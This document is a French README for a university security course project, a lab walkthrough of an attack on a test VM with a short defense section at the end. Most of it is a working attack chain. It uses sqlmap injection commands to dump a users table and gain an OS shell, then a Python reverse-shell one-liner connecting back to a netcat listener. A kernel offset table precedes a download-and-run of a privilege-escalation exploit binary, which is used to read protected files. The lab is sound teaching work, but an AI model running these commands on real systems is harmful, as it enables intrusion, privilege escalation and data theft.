# INF8602 – Projet de session

## Prérequis :

Ajouter la ligne suivante dans ``/etc/hosts`` :
```
IP_DE_LA_VM  inf8602.local
```

## Attaque
- Accéder à la page : http://inf8602.local
- Se connecter avec : ``ebelanger``, ``motdepasse``

### Exploration

Exploration à l'aide de sqlmap :
```bash
sqlmap --flush-session -u "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --method POST
```

On constate que le serveur est vulnérable.

Listons les tables :

```bash
sqlmap -u  "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --method POST --dump -T users --stop 5
```

Les NAS ne sont pas là...

### Obtention d'un shell

On souhaite obtenir un shell :
```bash
sqlmap -u  "http://inf8602.local:5000/login/?username=ebelanger&password=motdepasse" --dbms=postgresql --method POST --no-cast --os-shell
```

On lance ensuite, dans un autre teminal :
```bash
nc -l -p 8080 -vvv
```

Puis on lance la commande suivante dans le shell sqlmap :
```bash
python3 -c 'a=__import__;s=a("socket").socket;o=a("os").dup2;p=a("pty").spawn;c=s();c.connect(("192.168.122.1",8080));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p("/bin/sh")'
```

**Le shell est obtenu!**

### Vulnérabilité du système d'exploitation

Il faut montrer que l'utilisateur est ``postgress`` et que les NAS sont dans ``/nas.txt`` :
```bash
whoami
ls -lsa /
uname -a
```

On constate que seul root peut accéder à ``/secure_folder/nas.txt``. On constate également que le kernel (``5.11.0-44-generic``) fait partie de la liste suivante :
```c
struct kernel_info kernels[] = {
    {"5.11.0-22-generic #23~20.04.1-Ubuntu", 0x33ceb0, 0x166c2c0},
    {"5.11.0-25-generic #27~20.04.1-Ubuntu", 0x33d390, 0x166c2e0},
    {"5.11.0-27-generic #29~20.04.1-Ubuntu", 0x33d390, 0x166c2e0},
    {"5.11.0-34-generic #36~20.04.1-Ubuntu", 0x33e740, 0x166c340},
    {"5.11.0-36-generic #40~20.04.1-Ubuntu", 0x33e740, 0x166c340},
    {"5.11.0-37-generic #41~20.04.2-Ubuntu", 0x33eae0, 0x166c340},
    {"5.11.0-38-generic #42~20.04.1-Ubuntu", 0x33f400, 0x166c340},
    {"5.11.0-40-generic #44~20.04.2-Ubuntu", 0x33f980, 0x1c6c2e0},
    {"5.11.0-41-generic #45~20.04.1-Ubuntu", 0x33fdb0, 0x1c6c2e0},
    {"5.11.0-43-generic #47~20.04.2-Ubuntu", 0x33fdb0, 0x1c6c2e0},
    {"5.11.0-44-generic #48~20.04.2-Ubuntu", 0x3400b0, 0x1c6c2e0},
    {"5.13.0-21-generic #21~20.04.1-Ubuntu", 0x34adc0, 0x1e6e060},
    {"5.13.0-22-generic #22~20.04.1-Ubuntu", 0x34b280, 0x1e6e060},
    {"5.13.0-23-generic #23~20.04.2-Ubuntu", 0x34b270, 0x1e6e0a0},
    {"5.13.0-25-generic #26~20.04.1-Ubuntu", 0x34b330, 0x1e6e0a0},
};
```

Il est possible de réaliser une élévation de privilège :
```bash
wget https://github.com/bourquejulien/INF8602-Projet/raw/main/SELinux/attack/exploit
chmod +x exploit
./exploit
bash -p
```

Il est maintenant possible d'accéder au NAS :
```bash
whoami
cat /nas.csv
```

## Défense

Pour relance la DB (au besoin, tuer ``./exploit`` au préalable) :
```bash
sudo systemctl restart postgresql
```

**Plusieurs défenses existent.**

Pour éviter les injections SQL :
```bash
sudo systemctl stop inf8602
sudo systemctl start inf8602-safe
```

Pour éviter l'exécution de l'attaque :
```bash
sudo systemctl stop inf8602-safe
sudo systemctl start inf8602

sestatus
sudo setenforce 1
sestatus
```

**Relancer l'attaque**
